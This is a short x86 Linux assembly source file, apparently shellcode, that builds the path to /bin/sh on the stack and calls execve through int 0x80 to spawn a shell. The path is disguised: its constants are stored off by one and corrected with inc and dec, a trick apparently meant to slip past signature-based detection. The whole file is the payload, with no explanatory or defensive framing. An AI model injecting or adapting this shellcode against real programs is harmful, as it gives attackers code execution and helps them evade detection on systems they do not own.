section .text

global _start

_start:
	xor ecx, ecx
	mul ecx
	push ecx

	mov edi, 0x68732f2e
	inc edi
	mov esi, 0x6e696230
	dec esi

	push edi
	push esi
	
	mov ebx, esp
	mov al, 0xb
	int 0x80
